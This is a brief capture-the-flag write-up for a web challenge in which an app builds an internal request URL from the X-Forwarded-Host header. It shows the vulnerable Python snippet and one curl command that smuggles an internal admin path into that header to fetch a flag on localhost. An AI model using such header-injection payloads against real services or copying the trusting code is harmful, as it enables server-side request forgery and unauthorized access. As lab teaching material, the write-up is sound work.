## GHost in the Cafeteria

The Challenge is a simple Web Page, not much to see only one option to see the normal menu. However behind an Reverse Proxy is a special Admin Lunch menu.

The intended Solution is to add an X-Forward-Header to your own request to access the admin Lunch.

```
    user_controlled_host = request.headers.get('X-Forwarded-Host', 'internal_api:5000')
    
    internal_url = f"http://{user_controlled_host}/api/v1/menu"
```

The Application trusts the incoming X-Forwarded-Header without a doubt, that is the problem.

`curl -H "X-Forwarded-Host: internal_api:5000/api/v1/admin/flag?" http://localhost:8080/get-menu`

All you need is this request to solve it.